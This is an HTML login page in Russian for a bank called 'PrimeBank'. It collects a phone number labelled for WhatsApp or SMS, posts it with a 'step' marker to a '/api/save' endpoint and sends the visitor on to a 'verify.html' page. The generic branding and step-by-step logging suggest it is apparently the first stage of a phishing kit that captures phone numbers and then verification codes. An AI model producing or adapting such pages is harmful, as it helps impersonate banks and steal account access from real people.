<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PrimeBank — Вход / Регистрация</title>

<link rel="icon" type="image/png" sizes="32x32" href="logopng.png">
<link rel="icon" type="image/png" sizes="16x16" href="logopng.png">
<link rel="apple-touch-icon" href="logopng.png">

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">

<style>
* { box-sizing: border-box; font-family: Roboto, "Open Sans", sans-serif; }
body {
  margin:0;
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
}
.auth-container {
  background:#fff;
  width:100%;
  max-width:420px;
  padding:32px;
  border-radius:16px;
  box-shadow:0 20px 40px rgba(0,0,0,0.15);
}
.brand {
  text-align:center;
  margin-bottom:24px;
  font-size:24px;
  font-weight:700;
  letter-spacing:0.5px;
  color:#203a43;
}
.field { margin-bottom:16px; }
.field label {
  display:block;
  margin-bottom:6px;
  font-size:14px;
  color:#555;
}
.field input {
  width:100%;
  padding:12px 14px;
  border-radius:10px;
  border:1px solid #ccc;
  font-size:15px;
  outline:none;
  transition:0.2s;
}
.field input:focus { border-color:#203a43; }

.submit-btn {
  width:100%;
  padding:14px;
  border-radius:12px;
  border:none;
  background:#203a43;
  color:#fff;
  font-size:16px;
  font-weight:500;
  cursor:pointer;
  transition:0.3s;
}
.submit-btn:hover {
  background:#162b33;
  transform:translateY(-2px);
}

.error {
  color:red;
  font-size:14px;
  margin-top:10px;
  display:none;
}

@media (max-width:480px){
  .auth-container{padding:24px 16px;}
  .brand{font-size:20px;}
  .submit-btn{font-size:15px;padding:12px;}
}
</style>
</head>
<body>

<div class="auth-container">
  <div class="brand">PrimeBank</div>

  <form id="phoneForm">
    <div class="field">
      <label for="phoneInput">Номер телефона (WhatsApp / SMS)</label>
      <input 
        type="tel"
        id="phoneInput"
        name="phone"
        placeholder="+7XXXXXXXXXX"
        required
      >
    </div>

    <button type="submit" class="submit-btn">Продолжить</button>
    <div class="error" id="errorMsg"></div>
  </form>
</div>

<script>
const phoneForm = document.getElementById("phoneForm");
const phoneInput = document.getElementById("phoneInput");
const errorMsg = document.getElementById("errorMsg");

phoneForm.addEventListener("submit", async function(e){
    e.preventDefault();

    errorMsg.style.display = "none";
    const phone = phoneInput.value.trim();

    // строгая проверка формата
    if(!/^\+7\d{10}$/.test(phone)){
        errorMsg.textContent = "Введите номер в формате +7XXXXXXXXXX";
        errorMsg.style.display = "block";
        return;
    }

    try {
        const response = await fetch("/api/save", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                phone: phone,
                step: "phone",
                date: new Date().toISOString()
            })
        });

        if(!response.ok){
            throw new Error("Ошибка ответа сервера");
        }

        // сохраняем локально
        localStorage.setItem("authPhone", phone);

        // переход
        window.location.href = "verify.html";

    } catch(err){
        console.error(err);
        errorMsg.textContent = "Ошибка соединения с сервером";
        errorMsg.style.display = "block";
    }
});
</script>

</body>
</html>








